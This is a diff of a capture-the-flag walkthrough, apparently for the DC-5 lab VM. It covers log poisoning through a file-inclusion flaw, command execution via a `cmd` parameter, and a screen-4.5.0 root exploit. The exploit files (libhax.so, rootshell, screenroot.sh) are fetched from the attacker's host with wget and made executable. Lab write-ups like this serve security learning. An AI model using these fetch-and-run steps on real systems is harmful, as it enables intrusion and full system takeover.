@@ -41,7 +41,7 @@ By DCAU
 * `passthru` allows us to execute an external program and display its raw output.
 * Note: The browswer is not used to send this GET request because it will URL-encode the request, making it useless.
 * Refresh the page, i.e. visit `http://10.0.2.12/thankyou.php?file=/var/log/nginx/access.log` and we see that there is an 'empty' GET request, which is really the request made when we executed the PHP code:
-![](/screenshots/dc-5/emptyGetRequest.jpg)
+![](/screenshots/dc-5/emptyGETRequest.jpg)
 * After that, visit `http://10.0.2.12/thankyou.php?file=/var/log/nginx/access.log&cmd=id` to confirm that we are able to run commands. We should expect to see the output of running `id` in the access logs, exactly at the log entry where our 'empty' GET request was made:
 ![](/screenshots/dc-5/commandExecutionAccessLogs.jpg)
 * Note: Visiting the page with the parameter `cmd=id` immediately after sending the GET request via netcat will result in the output of `id` being displayed as the latest one. I visited a few pages in between for the example above to illustrate my point that the output of the command will only appear exactly where the netcat GET request was made.
@@ -57,6 +57,7 @@ By DCAU
 * Googling about /bin/screen-4.5.0 led me to find out about the existence of 2 exploits relating to it on Exploit DB - [41152](https://www.exploit-db.com/exploits/41152) and [41154](https://www.exploit-db.com/exploits/41154). I could not quite understand the former, so we will use the latter.
 * To upload the exploit script, run `python -m SimpleHTTPServer 4567` on our Kali VM, then navigate to `/tmp` on our netcat shell before running `wget http://10.0.2.15:4567/41154.sh`:
 ![](/screenshots/dc-5/uploadExploitScript.jpg)
+* The status code `200 OK` tells us that the upload is successful.
 * Note: According to [Python For Beginners](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver/), the SimpleHTTPServer module that comes with Python is a simple HTTP server that provides standard GET and HEAD request handlers. An advantage with the built-in HTTP server is that we do not have to install and configure anything.
 * Note: `4567` is also a port number of your choice just for the purpose of establishing this connection.
 * Once it has been downloaded to the web server /tmp directory, `chmod +x 41154.sh` to give it executable permissions.
@@ -73,12 +74,11 @@ By DCAU
 ![](/screenshots/dc-5/rootshellCompilation.jpg)
 * We will name our script `screenroot.sh`, although you can name it otherwise. This name is the file name of the original exploit script.
 ![](/screenshots/dc-5/screenRootScriptModified.jpg)
-* Time to upload all 3 files to the vulnerable web server:
+* Ensure that our SimpleHTTPServer is still running, and upload all 3 files to the vulnerable web server:
 1. `wget http://10.0.2.15:4567/libhax.so`
 2. `wget http://10.0.2.15:4567/rootshell`
 3. `wget http://10.0.2.15:4567/screenroot.sh`
 ![](/screenshots/dc-5/uploadExploitFiles.jpg)
-* The status code `200 OK` tells us that the upload is successful.
 * `chmod +x screenroot.sh` to give it executable permissions:
 ![](/screenshots/dc-5/filesInTmpDirectory.jpg)
 * For some unknown reason, I am unable to run it on one of my devices. Apparently there is a wrong ELF class, which I am unable to diagnose:
